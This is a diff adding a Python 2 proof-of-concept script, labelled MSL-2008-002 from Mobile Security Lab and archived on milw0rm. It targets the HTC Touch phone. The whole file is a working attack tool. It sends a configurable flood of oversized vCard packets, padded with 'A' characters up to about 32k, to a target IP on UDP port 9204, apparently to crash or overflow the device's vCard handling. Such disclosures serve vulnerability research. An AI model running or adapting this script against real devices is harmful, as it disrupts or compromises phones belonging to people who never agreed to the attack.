@@ -1,0 +1,122 @@
+#! /usr/bin/env python
+#
+# Copyright (c) 2009 Mobile Security Lab www.mseclab.com
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal 
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
+# copies of the Software, and to permit persons to whom the Software is 
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+
+from socket import *
+from sys import exit,argv
+from time import *
+import random
+from optparse import OptionParser
+
+# Global Variables
+PORT = 9204
+DEF_NUM_PACKETS = 10
+DEF_VCARD_LEN = 1410
+DEF_DELAY = 0.7
+VCARD_HEADER = "BEGIN:VCARD\r\nVERSION:2.1\r\nN:"
+VCARD_TRAILER = "\r\nEND:VCARD\r\n"
+    
+def main():
+    # Local variables
+    num_packets = DEF_NUM_PACKETS
+    delay = DEF_DELAY
+    
+    print "\nMSL-2008-002 PoC for HTC Touch\nMobile Security Lab 2009\n"
+    # Parsing options
+    parser = OptionParser("usage: %prog [options] target_IP")
+    parser.add_option("-s", "--silence", action="store_true", dest="silence", help="send silent vcards (32k)")
+    parser.add_option("-c", "--count", type="int", help="specify vcard length", dest="count")
+    parser.add_option("-d", "--delay", type="float", help="specify delay between packets", dest="delay")
+    parser.add_option("-l", "--len", type="int", help="specify vcard length", dest="len")
+    parser.add_option("-t", "--text", type="string", help="specify vcard body text", dest="text")
+    
+    # Parse input
+    (options, args) = parser.parse_args()
+    if len(args) != 1:
+        parser.print_help()
+        print ""
+        exit(1)
+        
+    if options.count:
+        num_packets = options.count
+    
+    if options.delay:
+        delay = options.delay
+        
+    if options.silence:
+        vcard_body = VCARD_HEADER+'A' *32722+VCARD_TRAILER
+    elif options.len:
+        vcard_body = VCARD_HEADER+'A' *options.len+VCARD_TRAILER
+    elif options.text:
+        vcard_body = VCARD_HEADER+options.text+VCARD_TRAILER
+    else:
+        vcard_body = VCARD_HEADER+'A' *DEF_VCARD_LEN+VCARD_TRAILER
+        
+    # Socket creation
+    udp_sock = socket(AF_INET, SOCK_DGRAM)
+    ADDR = (args[0],PORT)
+    
+    # Start sending packet
+    counter = 1
+    c_lap = 0
+    total_data = 0
+    print "Sending %d packets... to %s" % (num_packets,ADDR)
+    start_time = time()
+    start_lap = time()
+
+    # Start sending packet
+    while counter <= num_packets:
+        len_sent = udp_sock.sendto(vcard_body,ADDR)
+        if len_sent != len(vcard_body):
+            print "Error sending packet n.%d" %counter
+            break
+    
+        # Update Counter
+        counter += 1
+        c_lap += 1
+        total_data += len_sent 
+    
+        # Sleep for letting the device parse vcards 
+        sleep(delay)
+        
+        # Check number of packets in a second
+        local_lap = time()
+        if local_lap - start_lap >= 1:
+            print "%0.2f packets/sec" % (c_lap/(local_lap - start_lap))
+            start_lap = local_lap
+            c_lap = 0
+    
+    stop_time = time() 
+    stop_sec = stop_time - start_time
+    
+    # Display info
+    print "Sent %d packets in %f seconds" % (num_packets, stop_sec)
+    print "Start time: %s" %ctime(start_time)
+    print "Stop time: %s" %ctime(stop_time)
+    print "Payload Len = %d bytes" % len(vcard_body)
+    print "Total Data sent = %d bytes (about %0.2f kB)" % (total_data, (float(total_data)/float(1024)))
+
+#Global start
+if __name__ == "__main__":
+    main()
+
+# milw0rm.com [2009-03-02]
